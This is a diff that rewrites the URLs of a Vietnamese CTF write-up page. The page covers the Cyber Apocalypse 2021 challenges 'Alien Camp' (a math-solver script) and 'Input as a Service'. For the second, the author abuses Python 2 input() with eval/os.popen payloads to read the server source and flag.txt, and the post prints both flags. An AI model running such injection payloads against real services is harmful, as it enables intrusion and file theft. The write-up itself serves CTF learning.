@@ -7,17 +7,17 @@
 {  
   "@context":"http://schema.org",
   "@type":"Website",
-  "@id":"https:\/\/manhnv.com\/",
+  "@id":"https:\/\/old.manhnv.com\/",
   "author": {
     "@type": "Person",
     "name": "Manh NV",
     
-    "image": "https://manhnv.com/favicon.png"
+    "image": "https://old.manhnv.com/favicon.png"
     
   },
   "name":"Chia sẻ là niềm vui",
   "description":"1. Alien Camp Bài này đơn giản là cho một server với 1 port mở như vầy.\nĐây là yêu cầu của đề bài\nKhi connect vào server thì có các thông tin sau. Đơn giản và dễ hiểu thì là tính toán và gửi kết quả cho nó. Nó có tận 500 bài toán lận.\nBài này thiên về kiểu viết code để tính toán, logic tý là ra nên khỏi phải giải thích nhiều.",
-  "url":"https:\/\/manhnv.com\/post\/ctf\/cyber-apocalypse-2021\/misc\/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup\/",
+  "url":"https:\/\/old.manhnv.com\/post\/ctf\/cyber-apocalypse-2021\/misc\/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup\/",
   "keywords":"[, manhnv, development, cyber security, hacker, CTF, CTF writeup]"
 }
 
@@ -41,8 +41,8 @@ Bài này thiên về kiểu viết code để tính toán, logic tý là ra nê
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Cyber Apocalypse 2021]- Misc Alien Camp and Input as a Service writeup">
 <meta name="twitter:title" content="[Cyber Apocalypse 2021]- Misc Alien Camp and Input as a Service writeup">
-<meta property="og:url" content="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
-<meta property="twitter:url" content="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
+<meta property="og:url" content="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
+<meta property="twitter:url" content="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
 <meta property="og:site_name" content="Chia sẻ là niềm vui">
 <meta property="og:description" content="1. Alien Camp Bài này đơn giản là cho một server với 1 port mở như vầy.
 Đây là yêu cầu của đề bài
@@ -87,25 +87,25 @@ Bài này thiên về kiểu viết code để tính toán, logic tý là ra nê
 
 
 
-  <meta property="og:image" content="https://manhnv.com/favicon.png">
-  <meta property="twitter:image" content="https://manhnv.com/favicon.png">
+  <meta property="og:image" content="https://old.manhnv.com/favicon.png">
+  <meta property="twitter:image" content="https://old.manhnv.com/favicon.png">
 
 
 
 
 
-  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png">
-  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png">
+  <meta property="og:image" content="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png">
+  <meta property="twitter:image" content="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png">
 
 
     <title>[Cyber Apocalypse 2021]- Misc Alien Camp and Input as a Service writeup</title>
 
-    <link rel="icon" href="https://manhnv.com/favicon.png">
+    <link rel="icon" href="https://old.manhnv.com/favicon.png">
     
 
     
 
-    <link rel="canonical" href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
+    <link rel="canonical" href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
@@ -113,11 +113,11 @@ Bài này thiên về kiểu viết code để tính toán, logic tý là ra nê
     
     
     
-    <link rel="stylesheet" href="https://manhnv.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    <link rel="stylesheet" href="https://old.manhnv.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
     
     
       
-        <link rel="stylesheet"  href="https://manhnv.com/css/mystyle.css">
+        <link rel="stylesheet"  href="https://old.manhnv.com/css/mystyle.css">
       
     
 
@@ -144,17 +144,17 @@ if (!doNotTrack) {
       <header id="header" data-behavior="5">
   <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
   <div class="header-title">
-    <a class="header-title-link" href="https://manhnv.com/" aria-label="Tới trang chủ">Chia sẻ là niềm vui</a>
+    <a class="header-title-link" href="https://old.manhnv.com/" aria-label="Tới trang chủ">Chia sẻ là niềm vui</a>
   </div>
   
     
       <a class="header-right-picture "
-         href="https://manhnv.com/#about" aria-label="Mở liên kết: /#about">
+         href="https://old.manhnv.com/#about" aria-label="Mở liên kết: /#about">
     
     
     
       
-        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        <img class="header-picture" src="https://old.manhnv.com/favicon.png" alt="Ảnh đại diện" />
       
     
     </a>
@@ -165,8 +165,8 @@ if (!doNotTrack) {
   <div class="sidebar-container">
     
       <div class="sidebar-profile">
-        <a href="https://manhnv.com/#about" aria-label="Tìm hiểu thêm về tác giả">
-          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        <a href="https://old.manhnv.com/#about" aria-label="Tìm hiểu thêm về tác giả">
+          <img class="sidebar-profile-picture" src="https://old.manhnv.com/favicon.png" alt="Ảnh đại diện" />
         </a>
         <h4 class="sidebar-profile-name">Manh NV</h4>
         
@@ -178,7 +178,7 @@ if (!doNotTrack) {
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/donate.html" title="Donate">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/donate.html" title="Donate">
     
       <i class="sidebar-button-icon fa fa-usd"></i>
       
@@ -188,7 +188,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/" title="Home">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/" title="Home">
     
       <i class="sidebar-button-icon fa fa-lg fa-home"></i>
       
@@ -198,7 +198,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/categories" title="Categories">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/categories" title="Categories">
     
       <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
       
@@ -208,7 +208,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/tags" title="Tags">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/tags" title="Tags">
     
       <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
       
@@ -218,7 +218,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/archives" title="Archives">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/archives" title="Archives">
     
       <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
       
@@ -228,7 +228,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/#about" title="About">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/#about" title="About">
     
       <i class="sidebar-button-icon fa fa-lg fa-question"></i>
       
@@ -238,7 +238,7 @@ if (!doNotTrack) {
 
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://manhnv.com/copyrights" title="Copyrights">
+      <a class="sidebar-button-link " href="https://old.manhnv.com/copyrights" title="Copyrights">
     
       <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
       
@@ -318,14 +318,14 @@ if (!doNotTrack) {
   
     <span>mục</span>
     
-      <a class="category-link" href="https://manhnv.com/categories/ctf">ctf</a>
+      <a class="category-link" href="https://old.manhnv.com/categories/ctf">ctf</a>
     
   
 
     |
-    <a href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/#post-comments">
+    <a href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/#post-comments">
 	    <i class="fa fa-comments-o" aria-hidden="true"></i>
-	    <span class="disqus-comment-count" data-disqus-url="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">First article</span>
+	    <span class="disqus-comment-count" data-disqus-url="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/">First article</span>
 	</a>
   </div>
 
@@ -335,11 +335,11 @@ if (!doNotTrack) {
             <div class="main-content-wrap">
               <h2 id="1-alien-camp">1. Alien Camp</h2>
 <p>Bài này đơn giản là cho một server với 1 port mở như vầy.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.20.57.png"></p>
 <p>Đây là yêu cầu của đề bài</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.08.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.08.25.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.08.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.08.25.png"></p>
 <p>Khi connect vào server thì có các thông tin sau. Đơn giản và dễ hiểu thì là tính toán và gửi kết quả cho nó. Nó có tận 500 bài toán lận.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.07.19.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.07.19.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.07.19.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.07.19.png"></p>
 <p>Bài này thiên về kiểu viết code để tính toán, logic tý là ra nên khỏi phải giải thích nhiều.
 Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các bạn :D</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
@@ -418,15 +418,15 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
 </span></span></code></pre></div><p>Flag là: <code>CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}</code></p>
 <h2 id="2-input-as-a-service">2. Input as a Service</h2>
 <p>Những gì bài cho là một ip và port.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.19.39.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.19.39.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.19.39.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.19.39.png"></p>
 <p>Thử connect vào và điền một vài thứ gì đó ngớ ngẩn, thì tôi có được thông báo lỗi như sau:</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.10.48.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.10.48.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.10.48.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.10.48.png"></p>
 <p>Báo lỗi là tên không được tìm thấy, vậy là những gì tôi nhập vào được xem là 1 biến, và nó không chạy được là do không tìm thấy ư? ư? ư? Một câu hỏi lớn, và chú ý hơn nữa thì có dòng <code>text = input(' ')</code> và phiên bản python là <code>2.7.18</code></p>
 <p>Hay lắm, vậy chắc chắn là những gì tôi nhập vào sẽ được đi qua hàm input, ở phiên bản python <code>2.7.18</code>. Đây là mấu chốt, ở phiên bản python này, input đã được khuyến nghị là không nên sử dụng, vì nó không an toàn, có thể sử dụng <code>code injection</code> thông của hàm này.</p>
 <p>Vậy thử thôi, thực ra là thi CTF chả có thời gian mà thử nhiều, tôi thử luôn như dưới cho chắc ăn.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>eval(compile(<span style="color:#e6db74">&#34;&#34;&#34;__import__(&#39;os&#39;).popen(r&#39;cat /app/input_as_a_service.py&#39;).read()&#34;&#34;&#34;</span>,<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;single&#39;</span>))
 </span></span></code></pre></div><p>Tôi đọc file <code>/app/input_as_a_service.py</code>, file này thấy khi server trả về lỗi, mục đích là đọc source code trong này để đảm bảo rằng suy nghĩ của tôi đúng.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.15.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.15.25.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.15.25.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.15.25.png"></p>
 <p>Sau khi chạy thì server đã trả về source code cho tôi như dưới.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2.7</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> version
@@ -447,11 +447,11 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
 </span></span></code></pre></div><p>Vậy là luồng suy nghĩ của tôi ngay từ đầu đã đúng, bây giờ thì xem file flag nằm ở đâu chứ nhỉ. Có thể sử dụng bất cứ lệnh gì để tìm file <code>flag</code>. Ví dụ: <code>find / -name 'flag*'</code>, <code>ls</code> xem chúng có ở cùng folder với file chạy không.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(compile(<span style="color:#e6db74">&#34;&#34;&#34;__import__(&#39;os&#39;).popen(r&#39;ls&#39;).read()&#34;&#34;&#34;</span>,<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;single&#39;</span>))
 </span></span></code></pre></div><p>Tôi <code>ls</code> thử thì đã thấy được file flag là <code>flag.txt</code>.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.22.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.22.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.22.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.22.png"></p>
 <p>Bây giờ chỉ cần đọc nó thôi là xong bài này rồi.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(compile(<span style="color:#e6db74">&#34;&#34;&#34;__import__(&#39;os&#39;).popen(r&#39;cat flag.txt&#39;).read()&#34;&#34;&#34;</span>,<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;single&#39;</span>))
 </span></span></code></pre></div><p>Đã tìm thấy được flag.</p>
-<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.59.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.59.png"></p>
+<p><img src="https://old.manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.59.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.18.59.png"></p>
 <p><code>Flag là: CHTB{4li3n5_us3_pyth0n2.X?!}</code></p>
 
               
@@ -467,13 +467,13 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf/">ctf</a>
+  <a class="tag tag--primary tag--small" href="https://old.manhnv.com/tags/ctf/">ctf</a>
 
-  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 2021</a>
+  <a class="tag tag--primary tag--small" href="https://old.manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 2021</a>
 
-  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf-misc-writeup/">ctf misc writeup</a>
+  <a class="tag tag--primary tag--small" href="https://old.manhnv.com/tags/ctf-misc-writeup/">ctf misc writeup</a>
 
-  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/writeup/">writeup</a>
+  <a class="tag tag--primary tag--small" href="https://old.manhnv.com/tags/writeup/">writeup</a>
 
                   </div>
                 
@@ -486,7 +486,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-build-yourself-in-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup" aria-label="Tiếp: [Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-build-yourself-in-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup" aria-label="Tiếp: [Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
           
               <i class="fa fa-angle-left"></i>
               <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
@@ -494,7 +494,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/web/cyber-apocalypse-2021-web-daas-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web Daas writeup" aria-label="Trước: [Cyber Apocalypse 2021]- Web Daas writeup">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/web/cyber-apocalypse-2021-web-daas-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web Daas writeup" aria-label="Trước: [Cyber Apocalypse 2021]- Web Daas writeup">
           
               <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
               <i class="fa fa-angle-right"></i>
@@ -512,19 +512,19 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
     </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
           <i class="fab fa-facebook-square" aria-hidden="true"></i>
         </a>
       </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
           <i class="fab fa-twitter" aria-hidden="true"></i>
         </a>
       </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
           <i class="fab fa-linkedin" aria-hidden="true"></i>
         </a>
       </li>
@@ -555,7 +555,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
     </div>
     <script type="text/javascript">
       var disqus_config = function() {
-        this.page.url = 'https:\/\/manhnv.com\/post\/ctf\/cyber-apocalypse-2021\/misc\/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup\/';
+        this.page.url = 'https:\/\/old.manhnv.com\/post\/ctf\/cyber-apocalypse-2021\/misc\/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup\/';
         
           this.page.identifier = '\/post\/ctf\/cyber-apocalypse-2021\/misc\/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup\/'
         
@@ -580,7 +580,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2022 <a href="https://manhnv.com">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+    &copy; 2022 <a href="https://old.manhnv.com">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
   </span>
 </footer>
 
@@ -593,7 +593,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-build-yourself-in-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup" aria-label="Tiếp: [Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-build-yourself-in-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup" aria-label="Tiếp: [Cyber Apocalypse 2021]- Misc &#39;Build yourself in&#39; writeup">
           
               <i class="fa fa-angle-left"></i>
               <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
@@ -601,7 +601,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/post/ctf/cyber-apocalypse-2021/web/cyber-apocalypse-2021-web-daas-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web Daas writeup" aria-label="Trước: [Cyber Apocalypse 2021]- Web Daas writeup">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/web/cyber-apocalypse-2021-web-daas-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Web Daas writeup" aria-label="Trước: [Cyber Apocalypse 2021]- Web Daas writeup">
           
               <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
               <i class="fa fa-angle-right"></i>
@@ -619,19 +619,19 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
     </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
           <i class="fab fa-facebook-square" aria-hidden="true"></i>
         </a>
       </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
           <i class="fab fa-twitter" aria-hidden="true"></i>
         </a>
       </li>
     
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://old.manhnv.com/post/ctf/cyber-apocalypse-2021/misc/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
           <i class="fab fa-linkedin" aria-hidden="true"></i>
         </a>
       </li>
@@ -662,19 +662,19 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Facebook">
